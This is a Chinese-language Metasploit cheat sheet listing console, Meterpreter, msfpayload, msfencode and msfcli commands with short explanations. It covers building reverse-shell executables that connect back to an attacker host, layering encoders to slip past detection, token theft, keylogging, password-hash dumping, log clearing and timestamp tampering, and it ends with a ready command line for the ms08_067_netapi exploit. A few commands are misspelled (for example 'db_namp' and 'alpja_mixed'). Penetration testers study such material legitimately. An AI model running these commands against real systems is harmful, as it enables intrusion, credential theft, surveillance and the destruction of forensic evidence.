show exploits

列出metasploit框架中的所有渗透攻击模块。
show payloads

列出metasploit框架中的所有攻击载荷。
show auxiliary

列出metasploit框架中的所有辅助攻击载荷。
search name

查找metasploit框架中所有的渗透攻击和其他模块。
info

展示出制定渗透攻击或模块的相关信息。
use name

装载一个渗透攻击或模块。
LHOST

你本地可以让目标主机连接的IP地址，通常当目标主机不在同一个局域网内时，就需要是一个公共IP地址，特别为反弹式shell使用。
RHOST

远程主机或是目标主机。
set function

设置特定的配置参数（EG：设置本地或远程主机参数）。
setg function

以全局方式设置特定的配置参数（EG：设置本地或远程主机参数）。
show options

列出某个渗透攻击或模块中所有的配置参数。
show targets

列出渗透攻击所有支持的目标平台。
set target num

指定你所知道的目标的操作系统以及补丁版本类型。
set payload name

指定想要使用的攻击载荷。
show advanced

列出所有高级配置选项。
set autorunscript migrate -f.

在渗透攻击完成后，将自动迁移到另一个进程。
check

检测目标是否选定渗透攻击存在相应的安全漏洞。
exploit

执行渗透攻击或模块来攻击目标。
exploit -j

在计划任务下进行渗透攻击（攻击将在后台进行）。
exploit -z

渗透攻击完成后不与回话进行交互。
exploit -e encoder

制定使用的攻击载荷编码方式（EG：exploit -e shikata_ga_nai）。
exploit -h

列出exploit命令的帮助信息。
sessions -l

列出可用的交互会话（在处理多个shell时使用）。
sessions -l -v

列出所有可用的交互会话以及详细信息，EG：攻击系统时使用了哪个安全漏洞。
sessions -s script

在所有活跃的metasploit会话中运行一个特定的metasploit脚本。
sessions -K

杀死所有活跃的交互会话。
sessions -c cmd

在所有活跃的metasploit会话上执行一个命令。
sessions -u sessionID

升级一个普通的win32 shell到metasploit shell。
db_create name

创建一个数据库驱动攻击所要使用的数据库（EG：db_create autopwn）。
db_connect name

创建并连接一个数据库驱动攻击所要使用的数据库（EG：db_connect user:passwd@ip/sqlname）。
db_namp

利用nmap并把扫描数据存储到数据库中（支持普通的nmap语句，EG：-sT -v -P0）。
db_autopwn -h

展示出db_autopwn命令的帮助信息。
db_autopwn -p -r -e

对所有发现的开放端口执行db_autopwn，攻击所有系统，并使用一个反弹式shell。
db_destroy

删除当前数据库。
db_destroy user：passwd@host：port/database

使用高级选项来删除数据库。
***metasploit命令***

help

打开meterpreter使用帮助。
run scriptname

运行meterpreter脚本，在scripts/meterpreter目录下可查看到所有脚本名。
sysinfo

列出受控主机的系统信息。
ls

列出目标主机的文件和文件夹信息。
use priv

加载特权提升扩展模块，来扩展metasploit库。
ps

显示所有运行的进程以及相关联的用户账户。
migrate PID

迁移到一个指定的进程ID（PID号可通过ps命令从主机上获得）。
use incognito

加载incognito功能（用来盗窃目标主机的令牌或假冒用户）
list_tokens -u

列出目标主机用户的可用令牌。
list_tokens -g

列出目标主机用户组的可用令牌。
impersonate_token DOMAIN_NAME\USERNAME

假冒目标主机上的可用令牌。
steal_token PID

盗窃给定进程的可用令牌并进行令牌假冒。
drop_token

停止假冒当前令牌。
getsystem

通过各种攻击向量来提升系统用户权限。
execute -f cmd.exe -i

执行cmd.exe命令并进行交互。
execute -f cmd.exe -i -t

以所有可用令牌来执行cmd命令并隐藏该进程。
rev2self

回到控制目标主机的初始用户账户下。
reg command

在目标主机注册表中进行交互，创建，删除，查询等操作。
setdesktop number

切换到另一个用户界面（该功能基于那些用户已登录）。
screenshot

对目标主机的屏幕进行截图。
upload file

向目标主机上传文件。
download file

从目标主机下载文件。
keyscan_start

针对远程目标主机开启键盘记录功能。
keyscan_dump

存储目标主机上捕获的键盘记录。
keyscan_stop

停止针对目标主机的键盘记录。
getprivs

尽可能多的获取目标主机上的特权。
uictl enable keyboard/mouse

接管目标主机的键盘和鼠标。
background

将你当前的metasploit shell转为后台执行。
hashdump

导出目标主机中的口令哈希值。
use sniffer

加载嗅探模式。
sniffer_interfaces

列出目标主机所有开放的网络端口。
sniffer_dump interfaceID pcapname

在目标主机上启动嗅探。
sniffer_start interfaceID packet-buffer

在目标主机上针对特定范围的数据包缓冲区启动嗅探。
sniffer_stats interfaceID

获取正在实施嗅探网络接口的统计数据。
sniffer_stop interfaceID

停止嗅探。
add_user username password -h ip

在远程目标主机上添加一个用户。
clearev

清楚目标主机上的日志记录。
timestomp

修改文件属性，例如修改文件的创建时间（反取证调查）。
reboot

重启目标主机。
***MSFpayload命令***

msfpayload -h

msfpayload的帮助信息。
msfpayload windows/meterpreter/bind_tcp O

列出所有windows/meterpreter/bind_tcp下可用的攻击载荷的配置项（任何攻击载荷都是可用配置的）。
msfpayload windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT X > payload.exe

创建一个metasploit的reverse_tcp攻击载荷，回连到LHOSTip的LPORT，将其保存为名为payload.exe的windows下可执行程序。
msfpayload windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT R > payload.raw

创建一个metasploit的reverse_tcp攻击载荷，回连到LHOSTip的LPORT，将其保存为名为payload.raw，该文件后面的msffencode中使用。
msfpayload windows/meterpreter/reverse_tcp LPORT=PORT C > payload.c

创建一个metasploit的reverse_tcp攻击载荷，导出C格式的shellcode。
msfpayload windows/meterpreter/reverse_tcp LPORT=PORT J > payload.java

创建一个metasploit的reverse_tcp攻击载荷，导出成以%u编码方式的javaScript语言字符串。
***msfencode命令***

mefencode -h

列出msfencode的帮助命令。
msfencode -l

列出所有可用的编码器。
msfencode -t (c,elf,exe,java,is_le,js_be,perl,raw,ruby,vba,vbs,loop_vbs,asp,war,macho)

显示编码缓冲区的格式。
msfencode -i payload.raw -o encoded_payload.exe -e x86/shikata_ga_nai -c 5 -t exe

使用shikata_ga_nai编码器对payload.raw文件进行5编码，然后导出一个名为encoded_payload.exe的文件。
msfpayload windows/meterpreter/bind_tcp LPORT=PORT R | msfencode -e x86/_countdown -c 5 -t raw | msfencode -e x86/shikata_ga_nai -c 5 -t exe -o multi-encoded_payload.exe

创建一个经过多种编码格式嵌套编码的攻击载荷。
msfencode -i payload.raw BufferRegister=ESI -e x86/alpja_mixed -t c

创建一个纯字母数字的shellcode，由ESI寄存器只想shellcode，以C语言格式输出。
***MSFcli命令***

msfcli | grep exploit

仅列出渗透攻击模块。
msfcli | grep exploit/windows

仅列出与windows相关的渗透攻击模块。
msfcli exploit/windows/smb/ms08_067_netapi PAYLOAD=windows/meterpreter/bind_tcp LPORT=PORT RHOST=IP E

对IP发起ms08_067_netapi渗透攻击，配置了bind_tcp攻击载荷，并绑定在PORT端口进行监听。
